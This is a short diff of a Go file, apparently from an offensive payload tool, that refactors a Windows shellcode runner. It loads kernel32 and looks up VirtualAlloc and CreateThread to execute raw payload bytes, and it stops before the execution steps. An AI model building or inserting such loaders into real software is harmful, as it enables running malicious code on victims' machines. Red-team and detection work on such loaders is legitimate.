@@ -1,16 +1,17 @@
 // +build payload_type_shellcode
 
-package main
+package payload_types
 
 import (
-	"os"
 	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-func run(payload_data []byte) {
+func Run(payload_data []byte) {
+	var shellcode_len = len(payload_data) * 8
+
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
 	CreateThread := kernel32.NewProc("CreateThread")
